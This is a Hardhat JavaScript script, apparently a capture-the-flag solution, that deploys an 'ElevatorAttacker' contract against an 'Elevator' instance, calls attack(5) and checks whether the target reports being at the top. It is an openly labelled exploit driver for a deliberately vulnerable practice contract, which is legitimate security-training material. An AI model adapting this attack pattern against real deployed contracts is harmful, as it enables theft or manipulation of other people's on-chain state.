const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res, status
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0xb3192c5DC1f29C435500a45d22e695194555FA90"
    let target = await ethers.getContractAt("Elevator", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "ElevatorAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    tx = await attackerContract.attack(5)
    await tx.wait(1)

    // Check
    status = await target.top()
    if (status == true) {
        console.log(`${symbols.success} Reached the top!`)
    } else {
        console.log(`${symbols.error} Still not at the top...`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
